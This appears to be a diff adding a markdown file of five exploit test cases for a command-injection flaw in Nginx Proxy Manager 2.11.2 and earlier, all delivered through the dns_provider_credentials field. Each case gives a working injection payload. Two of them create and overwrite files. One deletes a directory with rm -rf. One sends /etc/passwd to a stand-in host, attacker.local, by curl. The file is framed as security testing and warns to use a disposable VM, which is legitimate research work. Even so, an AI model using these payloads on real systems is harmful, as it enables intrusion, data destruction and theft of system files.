@@ -1,0 +1,58 @@
+# Exploitable Test Cases for Nginx Proxy Manager ≤ 2.11.2  
+*All payloads are supplied through the `dns_provider_credentials` field in*  
+`backend/internal/certificate.js`.
+
+---
+
+## Test Case 1 – Create a File
+
+| Field | Value |
+|-------|-------|
+| **Payload** | `apikey'); touch /tmp/pwned; echo '` |
+| **Objective** | Prove arbitrary command execution by creating `/tmp/pwned`. |
+| **Assertion** | `/tmp/pwned` exists on the host after the request. |
+
+---
+
+## Test Case 2 – Blind Sleep Delay
+
+| Field | Value |
+|-------|-------|
+| **Payload** | `token'); sleep 5; echo '` |
+| **Objective** | Introduce a 5-second delay to confirm blind RCE. |
+| **Assertion** | API call takes ≥ 5 s longer than the baseline request. |
+
+---
+
+## Test Case 3 – Overwrite a File
+
+| Field | Value |
+|-------|-------|
+| **Payload** | `creds'); echo HACKED > /tmp/exploit.txt; echo '` |
+| **Objective** | Overwrite `/tmp/exploit.txt` with attacker-controlled text. |
+| **Assertion** | `/tmp/exploit.txt` contains the string **HACKED**. |
+
+---
+
+## Test Case 4 – Delete a Directory
+
+| Field | Value |
+|-------|-------|
+| **Payload** | `xyz'); rm -rf /tmp/testdir; echo '` |
+| **Objective** | Execute a destructive command to remove `/tmp/testdir`. |
+| **Assertion** | Directory `/tmp/testdir` no longer exists. |
+
+---
+
+## Test Case 5 – Exfiltrate Sensitive Data
+
+| Field | Value |
+|-------|-------|
+| **Payload** | `secret'); curl http://attacker.local/$(cat /etc/passwd) >/dev/null; echo '` |
+| **Objective** | Exfiltrate `/etc/passwd` contents to an external server. |
+| **Assertion** | Attacker’s listener at `attacker.local` receives the data. |
+
+---
+
+> **Warning**  Run these tests only in a disposable VM or container.  
+> They leverage real command-injection and can damage or expose the host.
